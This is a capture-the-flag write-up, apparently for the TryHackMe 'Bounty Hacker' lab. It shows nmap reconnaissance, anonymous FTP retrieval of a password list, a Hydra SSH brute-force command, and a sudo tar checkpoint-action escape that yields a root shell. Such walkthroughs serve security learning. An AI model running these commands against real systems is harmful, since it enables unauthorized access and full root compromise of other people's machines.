## Nmap: 
---
```bash
nmap -T4 -A 10.64.161.189 -oN nmap 
```

```
Nmap scan report for 10.64.161.189
Host is up (0.11s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.154.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 36:40:93:14:b9:6a:01:45:3a:f7:55:a9:13:48:2f:19 (RSA)
|   256 33:5d:78:d9:77:4d:b3:c9:1d:3e:50:26:e6:6f:e0:23 (ECDSA)
|_  256 a2:d7:5e:ba:97:de:35:5c:b4:b0:f2:76:57:2c:cb:0d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- we see a `website` is running, `SSH` and `FTP` is open 
- `FTP` has anonymous login allowed, so lets look into this first 
## FTP: 
---
```bash
ftp 10.64.161.189
```
- when `anonymous` login is allowed you can use "anonymous" as username an leave the password `blank` (press `ENTER` when asked for a password)
- when we list out the files that are in the directory, we are currently in, we see these two files: 
```bash
ftp> ls -ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```
- lets download them with `get <filename>` 

## Hydra: 
---
- `locks.txt`: 
```bash
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
- the `locks.txt` looks like a password-list

- `task.txt`: 
```bash 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-<Redacted>
```
- we can now answer the first question of the Box: `Who wrote the task list?` 

- this is likely a username we can use to log into `SSH`  
- here we can answer the second question: `What service can you bruteforce with the text file found?`
- `Answer`: SSH 

- lets try to `bruteforce` the password with the `username` and the `password-list`
- we can do this with `Hydra`: 
```bash 
hydra -l <Redacted> -P locks.txt 10.64.161.189 ssh
```

```bash
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.64.161.189:22/
[22][ssh] host: 10.64.161.189   login: <Redacted>   password: <Redacted>
1 of 1 target successfully completed, 1 valid password found
```
- now we can answer the third question 

- lets log into `SSH`: 
```bash
ssh lin@10.64.161.189
```
- now we can read the `user.txt`: 
```bash
THM{<Redacted>}
```

## Privilige Escalation: 
---
- lets run `sudo -l` to see if we can run anything with `sudo`
```bash
Matching Defaults entries for <Redacted> on ip-10-64-161-189:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-64-161-189:
    (root) /bin/tar
```
- so we can run `tar` with `sudo` as `root` 
- lets look up `tar` in the `GTFOBins` to see if can use this command to become `root`:
![](Bounty%20Hacker/images/Bounty_Hacker_1.png)
- lets try `(a)` to get a `root-shell` 
- the command for this would look like this: 
```bash 
sudo -u root tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
- i thought it was necessary to specify the `user` as `root`, but its actually already working without specifying one when running `sudo` 
- so now we are `root` and can read the `root.txt` in `/root` 
```bash
THM{<Redacted>}
```